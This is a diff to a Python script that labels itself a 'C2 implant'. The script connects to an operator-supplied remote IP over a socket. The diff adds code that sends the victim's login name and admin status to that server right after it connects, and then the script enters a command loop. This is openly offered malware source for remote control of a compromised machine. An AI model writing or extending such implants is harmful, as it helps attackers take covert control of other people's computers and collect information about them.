@@ -2,6 +2,7 @@ import socket
 import subprocess
 import os
 import argparse
+import ctypes
 
 parser = argparse.ArgumentParser(description='C2 implant ')
 parser.add_argument('-ip', type=str, required=True, help='Input the remote IP  ')
@@ -28,6 +29,8 @@ def outbound_comm(message): #Handle outgoing comms - sending response to server
 def session_handler(): # Handle the sessions, connections, port etc - handle implate functionality as well
     print(f'[+] Trying to connect to {host_ip}')
     sock.connect((host_ip,host_port))
+    outbound_comm(os.getlogin())
+    outbound_comm(ctypes.windll.shell32.IsUserAnAdmin())
     print(f'[+] Connected to {host_ip}')
 
     while True:
